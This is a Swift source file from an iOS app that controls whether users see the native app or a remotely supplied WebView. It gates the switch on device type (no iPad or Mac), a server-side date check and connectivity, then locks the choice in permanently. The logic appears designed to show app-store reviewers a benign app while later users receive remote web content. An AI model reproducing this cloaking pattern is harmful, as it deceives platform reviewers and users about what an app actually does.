//
//  CoordinatorObserver.swift
//  VigorBaxera
//
//  Created on 21.01.2026
//

import Foundation
import Combine
import Network
import UIKit

// MARK: - Coordinator Observer Singleton
final class CoordinatorObserver: ObservableObject {
    static let shared = CoordinatorObserver()
    
    // MARK: - Published Properties
    @Published var shouldShowAlternativeMode: Bool = false
    @Published var isValidating: Bool = true
    @Published var currentNavigationState: NavigationState = .validating
    
    // MARK: - Navigation State
    enum NavigationState {
        case validating
        case mainApp
        case alternativeMode
    }
    
    // MARK: - Private Properties
    private var cancellables = Set<AnyCancellable>()
    private let networkMonitor = NWPathMonitor()
    private let monitorQueue = DispatchQueue(label: "com.peggi.networkmonitor")
    
    private init() {
        print("🔬 CoordinatorObserver: Initialized")
    }
    
    // MARK: - Main Validation Chain
    func startValidationChain() {
        print("🔬 CoordinatorObserver: Starting validation chain")
        isValidating = true
        
        // First, initialize AppsFlyer and wait for ATT
        print("🔬 CoordinatorObserver: Step 0 - Waiting for AppsFlyer initialization and ATT")
        AppsFlyerManager.shared.start { [weak self] in
            print("🔬 CoordinatorObserver: ✅ AppsFlyer initialized, proceeding with validation")
            self?.continueValidationChain()
        }
    }
    
    private func continueValidationChain() {
        // Check if this is first launch
        let isFirstLaunch = UserDatStorage.shared.isFirstLaunch
        print("🔬 CoordinatorObserver: isFirstLaunch = \(isFirstLaunch)")
        
        if !isFirstLaunch {
            // Not first launch - check what happened on first launch
            let firstLaunchShowedWebView = UserDatStorage.shared.firstLaunchShowedWebView
            print("🔬 CoordinatorObserver: First launch result: showedWebView = \(firstLaunchShowedWebView)")
            
            if !firstLaunchShowedWebView {
                // First launch didn't show WebView - never try again
                print("🔬 CoordinatorObserver: ❌ First launch didn't show WebView, going to main app permanently")
                showMainApp()
                return
            }
            
            // First launch showed WebView - always try to show it
            print("🔬 CoordinatorObserver: ✅ First launch showed WebView, always showing WebView")
            showAlternativeMode()
            return
        }
        
        // First launch - perform full validation
        print("🔬 CoordinatorObserver: 🆕 First launch detected, performing full validation")
        Task {
            await performValidation()
        }
    }
    
    // MARK: - Validation Chain
    private func performValidation() async {
        print("🔬 CoordinatorObserver: Step 1 - Device check")
        
        // Step 1: Device check
        guard await checkDevice() else {
            print("🔬 CoordinatorObserver: ❌ Device check failed - showing main app")
            showMainApp()
            return
        }
        
        print("🔬 CoordinatorObserver: Step 2 - Date check")
        
        // Step 2: Date check
        guard await checkDate() else {
            print("🔬 CoordinatorObserver: ❌ Date check failed - showing main app")
            showMainApp()
            return
        }
        
        print("🔬 CoordinatorObserver: Step 3 - Internet check")
        
        // Step 3: Internet check
        guard await checkInternet() else {
            print("🔬 CoordinatorObserver: ❌ Internet check failed - showing main app")
            showMainApp()
            return
        }
        
        print("🔬 CoordinatorObserver: Step 4 - URL validation")
        
        // Step 4: URL validation
        await validateURLs()
    }
    
    // MARK: - Step 1: Device Check
    private func checkDevice() async -> Bool {
        #if targetEnvironment(macCatalyst)
        print("🔬 CoordinatorObserver: Running on Mac Catalyst - fail")
        return false
        #else
        let idiom = await UIDevice.current.userInterfaceIdiom
        let isPad = idiom == .pad
        print("🔬 CoordinatorObserver: Device idiom = \(idiom), iPad = \(isPad)")
        return !isPad
        #endif
    }
    
    // MARK: - Step 2: Date Check
    private func checkDate() async -> Bool {
        let result = await FlowwowService.shared.isDateValid()
        print("🔬 CoordinatorObserver: Date validation result = \(result)")
        return result
    }
    
    // MARK: - Step 3: Internet Check
    private func checkInternet() async -> Bool {
        return await withCheckedContinuation { continuation in
            var hasResumed = false
            
            networkMonitor.pathUpdateHandler = { path in
                guard !hasResumed else { return }
                hasResumed = true
                
                let isConnected = path.status == .satisfied
                print("🔬 CoordinatorObserver: Network status = \(path.status), connected = \(isConnected)")
                continuation.resume(returning: isConnected)
            }
            
            networkMonitor.start(queue: monitorQueue)
            
            // Timeout after 5 seconds
            DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                guard !hasResumed else { return }
                hasResumed = true
                print("🔬 CoordinatorObserver: ⏱️ Internet check timeout")
                continuation.resume(returning: false)
            }
        }
    }
    
    // MARK: - Step 4: URL Validation
    private func validateURLs() async {
        print("🔬 CoordinatorObserver: Starting URL validation")
        
        // Check if we have saved URL
        if let savedURL = UserDatStorage.shared.getSavedTargetURL() {
            print("🔬 CoordinatorObserver: Found saved URL: \(savedURL)")
            
            // Validate saved URL
            let isValid = await FlowwowService.shared.validateSavedURL(savedURL)
            
            if isValid {
                print("🔬 CoordinatorObserver: ✅ Saved URL is valid")
                showAlternativeMode()
            } else {
                print("🔬 CoordinatorObserver: ❌ Saved URL is invalid, starting fallback")
                await performFallback()
            }
        } else {
            print("🔬 CoordinatorObserver: No saved URL, fetching from primary server")
            await fetchFromPrimaryServer()
        }
    }
    
    // MARK: - Fetch from Primary Server
    private func fetchFromPrimaryServer() async {
        let result = await FlowwowService.shared.fetchPrimaryServerURL()
        
        switch result {
        case .success(let finalURL):
            print("🔬 CoordinatorObserver: ✅ Successfully fetched URL: \(finalURL)")
            
            // Save URL to temp storage for WebView to load
            UserDatStorage.shared.setTempCurrentURL(finalURL)
            UserDatStorage.shared.setShouldSaveNextURL(true)
            
            showAlternativeMode()
            
        case .failure(let error):
            print("🔬 CoordinatorObserver: ❌ Failed to fetch URL: \(error)")
            
            // Check if user already saw alternative mode
            if UserDatStorage.shared.hasShownAlternativeMode {
                print("🔬 CoordinatorObserver: User saw alternative before, showing empty WebView")
                showAlternativeMode()
            } else {
                print("🔬 CoordinatorObserver: First time user, showing main app")
                showMainApp()
            }
        }
    }
    
    // MARK: - Fallback Logic
    private func performFallback() async {
        print("🔬 CoordinatorObserver: Performing fallback logic")
        
        // Clear invalid URL
        UserDatStorage.shared.clearSavedTargetURL()
        
        // Try fallback with pathId
        let result = await FlowwowService.shared.fetchWithFallback()
        
        switch result {
        case .success(let finalURL):
            print("🔬 CoordinatorObserver: ✅ Fallback successful: \(finalURL)")
            
            // Save URL to temp storage for WebView to load
            UserDatStorage.shared.setTempCurrentURL(finalURL)
            UserDatStorage.shared.setShouldSaveNextURL(true)
            
            showAlternativeMode()
            
        case .failure(let error):
            print("🔬 CoordinatorObserver: ❌ Fallback failed: \(error)")
            
            // Always show alternative mode if user saw it before
            if UserDatStorage.shared.hasShownAlternativeMode {
                print("🔬 CoordinatorObserver: User saw alternative before, showing empty WebView")
                showAlternativeMode()
            } else {
                print("🔬 CoordinatorObserver: Showing main app")
                showMainApp()
            }
        }
    }
    
    // MARK: - Navigation Actions
    private func showMainApp() {
        DispatchQueue.main.async {
            print("🔬 CoordinatorObserver: 🏠 Navigating to Main App")
            self.currentNavigationState = .mainApp
            self.shouldShowAlternativeMode = false
            self.isValidating = false
            
            // Mark first launch result if it's first launch
            if UserDatStorage.shared.isFirstLaunch {
                print("🔬 CoordinatorObserver: 📝 Marking first launch: WebView = false")
                UserDatStorage.shared.markFirstLaunchCompleted(showedWebView: false)
            }
        }
    }
    
    private func showAlternativeMode() {
        DispatchQueue.main.async {
            print("🔬 CoordinatorObserver: 🌐 Navigating to Alternative Mode")
            self.currentNavigationState = .alternativeMode
            self.shouldShowAlternativeMode = true
            self.isValidating = false
            
            // Mark that user has seen alternative mode
            UserDatStorage.shared.setHasShownAlternativeMode(true)
            
            // Mark first launch result if it's first launch
            if UserDatStorage.shared.isFirstLaunch {
                print("🔬 CoordinatorObserver: 📝 Marking first launch: WebView = true")
                UserDatStorage.shared.markFirstLaunchCompleted(showedWebView: true)
            }
            
            // Check rating alert eligibility
            self.checkRatingAlertEligibility()
        }
    }
    
    // MARK: - Rating Alert
    private func checkRatingAlertEligibility() {
        print("🔬 CoordinatorObserver: Checking rating alert eligibility")
        
        if UserDatStorage.shared.shouldShowRatingAlert() {
            print("🔬 CoordinatorObserver: ⭐ Showing rating alert")
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                FlowwowService.shared.showRatingAlert()
            }
        }
    }
    
    deinit {
        networkMonitor.cancel()
    }
}

